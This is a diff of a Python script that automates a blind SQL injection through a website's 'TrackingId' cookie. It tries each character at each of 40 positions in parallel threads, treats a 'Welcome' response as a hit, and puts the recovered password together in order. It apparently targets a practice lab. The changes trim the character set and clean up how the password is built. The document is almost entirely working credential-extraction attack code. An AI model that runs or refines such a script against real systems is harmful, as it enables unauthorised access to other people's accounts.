@@ -21,7 +21,7 @@ if (len(sys.argv) != 2):
 #Global vars
 url = sys.argv[1]
 data = {}
-characters = string.ascii_letters + string.digits + string.punctuation
+characters = string.ascii_letters + string.digits
 
 def findChar(position, trackingIdCookie, p1, p2,s, characters_array,password):
     for char in characters:
@@ -33,11 +33,8 @@ def findChar(position, trackingIdCookie, p1, p2,s, characters_array,password):
         s.cookies.set('TrackingId', None)
         s.cookies.set('TrackingId', injection)
         r = s.get(url)
-        if ("Welcome" in r.text):
-            #print(type(password[position-1]))
-            #password[position-1] = char
+        if ("Welcome" in r.text):            
             characters_array.append((position,char))
-            p2.status(password)
             break
 
 def atacksqli():
@@ -51,7 +48,7 @@ def atacksqli():
     trackingIdCookie = cookies_init['TrackingId']
     characters_array = []
     threads = []
-    password = '' * 40
+    password = ''
     for position in range(1,40):
         thread = threading.Thread(target=findChar,args=(position,trackingIdCookie,p1,p2,s,characters_array,password))
         threads.append(thread)
@@ -62,9 +59,8 @@ def atacksqli():
     
     sorted_by_position = sorted(characters_array, key=lambda tup: tup[0])
     for char_sorted in sorted_by_position:
-        password2 += char_sorted[1]
+        password += char_sorted[1]
     print(password)
-    print(password2)
 
 if __name__ == "__main__":
     atacksqli()
